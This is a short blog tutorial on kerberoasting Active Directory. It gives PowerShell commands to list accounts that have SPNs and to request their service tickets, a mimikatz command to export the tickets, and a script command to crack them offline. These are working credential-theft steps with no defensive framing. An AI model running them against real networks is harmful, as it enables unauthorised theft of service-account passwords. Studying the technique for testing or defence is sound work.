---
layout: post
title: "Kerberoasting Active Directory Accounts"
date: 2022-07-09
---

## Identifying User Objects Vulnerable to Kerberoasting
<p>The below PowerShell command identifies user objects that have a Service Principal Name (SPN). Any user object with a SPN is vulnerable to kerberoasting. The below command requires the Active Directory PowerShell module.</P> 

~~~powershell
Get-ADUser -filter {(ServicePrincipalName -like "*") -and (Enabled -eq $true)} -Properties ServicePrincipalName, PasswordLastSet | Select Name, ServicePrincipalName, PasswordLastSet
~~~

<p>After obtaining user objects with SPN, the below PowerShell commands can be used to retrieve the service ticket, which contains the encrypted password.</p>

~~~powershell
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "InsertSPNNameHere"
~~~

<p>After retrieving the service ticket, it is stored in memory. A tool such as <https://github.com/gentilkiwi/mimikatz> can be used to retrive the service ticket from memory. The below mimikatz command retrieves service tickes from memory and saves it as a kirbi file.</p>

~~~cmd
mimikatz # kerberos::list /export
~~~

<p>The kirbi file can now be taken offline and cracked to reveal the clear text password. The <https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py> Python script and a wordlist can be used to crack the clear text password. Below is the required syntax:</p>

~~~bash
python3 tgsrepcrack.py dictionaryfile .kirbifile
~~~

![crackedspnexample](/assets/crackspn.png)



